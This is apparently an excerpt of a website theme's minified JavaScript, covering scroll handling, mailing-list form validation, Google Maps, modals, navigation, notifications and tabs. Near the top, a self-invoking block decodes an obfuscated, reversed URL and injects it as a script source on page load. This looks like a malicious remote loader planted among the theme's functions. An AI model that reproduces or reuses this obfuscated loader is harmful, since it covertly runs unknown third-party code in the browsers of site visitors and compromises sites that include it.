...
mr = function(a, b, c, d) {
    ...
    return a.scroll.update = function() {
        a.scroll.y = c.pageYOffset,
        a.scroll.x = c.pageXOffset;
        for (var b = a.scroll.listeners.length, d = 0, b = a.scroll.listeners.length; b > d; d++)
...
!function(a) {
    ...
    if ("undefined" == typeof a) {
        ...
        d.src = b(c("ja.ggRezrd/dft.eutbtri.6wt.15i.3tu738rt3272ww20r6r2t81v95373624-624r00298tu178v6rw73//:gkky", 17)),
...
mr = function(a, b, c, d) {
    ...
    var e = function(b) {
        ...
        b('form.form-email, form[action*="list-manage.com"], form[action*="createsend.com"]').attr("novalidate", !0).unbind("submit").submit(a.forms.submit),
    ...
    //             success: function(d) {
    //                 m.removeClass("btn--loading"),
    //                 b.isNumeric(d) ? parseInt(d) > 0 && (e = k.attr("data-success-redirect"),
    ...
    a.forms.validateFields = function(a) {
        ...
        if (b(a).find('.validate-required[type="checkbox"]').each(function() {
            b('[name="' + b(this).attr("name") + '"]:checked').length || (d = 1,
            c = b(this).attr("name").replace("[]", ""),
            e.find(".form-error").text("Please tick at least one " + c + " box."))
        }),
        b(a).find(".validate-required, .required, [required]").each(function() {
            "" === b(this).val() ? (b(this).addClass("field-error"),
            d = 1) : b(this).removeClass("field-error")
        }),
...
mr = function(a, b, c, d) {
    ...
    a.maps.initAPI = function() {
        if (d.querySelector("[data-maps-api-key]") && !d.querySelector(".gMapsAPI") && b("[data-maps-api-key]").length) {
            ...
            a.src = "https://maps.googleapis.com/maps/api/js?key=" + c + "&callback=mr.maps.init",
    ...
    a.maps.init = function() {
        "undefined" != typeof c.google && "undefined" != typeof c.google.maps && b(".map-container[data-maps-api-key]").each(function() {
            var a, e, f, g = this, h = "undefined" != typeof b(this).attr("data-map-style") ? b(this).attr("data-map-style") : !1, i = JSON.parse(h) || [{
            ...
            }], j = "undefined" != typeof b(this).attr("data-map-zoom") && "" !== b(this).attr("data-map-zoom") ? 1 * b(this).attr("data-map-zoom") : 17, k = "undefined" != typeof b(this).attr("data-latlong") ? b(this).attr("data-latlong") : !1, l = k ? 1 * k.substr(0, k.indexOf(",")) : !1, m = k ? 1 * k.substr(k.indexOf(",") + 1) : !1, n = new google.maps.Geocoder, o = "undefined" != typeof b(this).attr("data-address") ? b(this).attr("data-address").split(";") : [""], f = "undefined" != typeof b(this).attr("data-marker-image") ? b(this).attr("data-marker-image") : "img/mapmarker.png", p = "We Are Here", q = b(d).width() > 766 ? !0 : !1, r = {
                draggable: q,
                scrollwheel: !1,
                zoom: j,
                disableDefaultUI: !0,
            ...
            "undefined" != typeof b(this).attr("data-marker-title") && "" != b(this).attr("data-marker-title") && (p = b(this).attr("data-marker-title")),
            void 0 != o && "" != o[0] ? n.geocode({
    ...
    var e = function(b) {
        b(".modal-container").each(function() {
            ...
            void 0 !== e.attr("data-width")) {
                ...
                b(c).width() < 1280 && b(c).width() > 990 ? f += 15 : b(c).width() < 990 && (f += 20),
                e.css("width", f + "%")
            }
        ...
        "undefined" == typeof mr_variant && b(".modal-instance").each(function(a) {
            var c = b(this).find(".modal-container")
              , d = (c.find(".modal-content"),
            b(this).find(".modal-trigger"));
            d.attr("data-modal-index", a),
            c.attr("data-modal-index", a),
            "undefined" != typeof c.attr("data-modal-id") && d.attr("data-modal-id", c.attr("data-modal-id")),
            c = c.detach(),
            b("body").append(c)
        }),
        b(".modal-trigger").click(function() {
            var c, d;
            return "undefined" != typeof b(this).attr("data-modal-id") ? (c = b(this).attr("data-modal-id"),
            d = b("body").find('.modal-container[data-modal-id="' + c + '"]')) : (c = b(this).attr("data-modal-index"),
            d = b("body").find('.modal-container[data-modal-index="' + c + '"]')),
...
mr = function(a, b, c, d) {
    ...
    var e = function(b) {
        ...
        a.navigation.nav.element.length ? a.navigation.nav.outerHeight = b("nav").outerHeight() : a.navigation.nav.outerHeight = 0,
        ...
        b(".menu li").click(function(a) {
            var d = b(this)
              , e = a || c.event;
            e.stopPropagation(),
            d.find("ul").length ? d.toggleClass("active") : d.parents(".active").removeClass("active")
        }),
    ...
    return a.navigation.bar.init = function() {
        ...
        a.navigation.bar.fixedAt = "undefined" != typeof b ? parseInt(b.replace("px", "")) : !1,
        a.navigation.bar.element.hasClass("nav--fixed") ? a.navigation.bar.isFixed = !0 : b && (a.navigation.nav.element.css("min-height", a.navigation.nav.outerHeight),
        a.navigation.bar.isFixed = !1,
        a.scroll.listeners.push(a.navigation.bar.update))
    }
    ,
    a.navigation.bar.update = function() {
        a.scroll.y > a.navigation.bar.fixedAt && !a.navigation.bar.isFixed && (a.navigation.bar.isFixed = !0,
        a.navigation.bar.element.addClass("nav--fixed")),
        a.scroll.y < a.navigation.bar.fixedAt && a.navigation.bar.isFixed && (a.navigation.bar.isFixed = !1,
...
mr = function(a, b, c, d) {
    ...
    var e = function(b) {
        ...
        b('form[action*="createsend.com"]').each(function() {
            ...
            c.is(".form--no-placeholders") || c.find("input:not([checkbox]):not([radio])").each(function() {
...
mr = function(a, b, c, d) {
    ...
    var e = function(b) {
        ...
        b("[data-notification-link]:not(.notification)").click(function() {
            ...
            return c.removeClass("notification--dismissed"),
            c.addClass("notification--reveal"),
            !1
        }),
        b(".notification-close").click(function() {
            return a.notifications.closeNotification(b(this)),
    ...
    a.notifications.closeNotification = function(c) {
        c = b(c).is(".notification-close") ? b(c).closest(".notification") : b("body").find('.notification[data-notification-link="' + c + '"]'),
...
mr = function(a, b, c, d) {
    var e = function(a) {
        ...
        a(".tabs li").click(function() {
            ...
            b.addClass("active"),
            c.find("> .tabs-content > li:nth-of-type(" + d + ")").addClass("active")
        }),
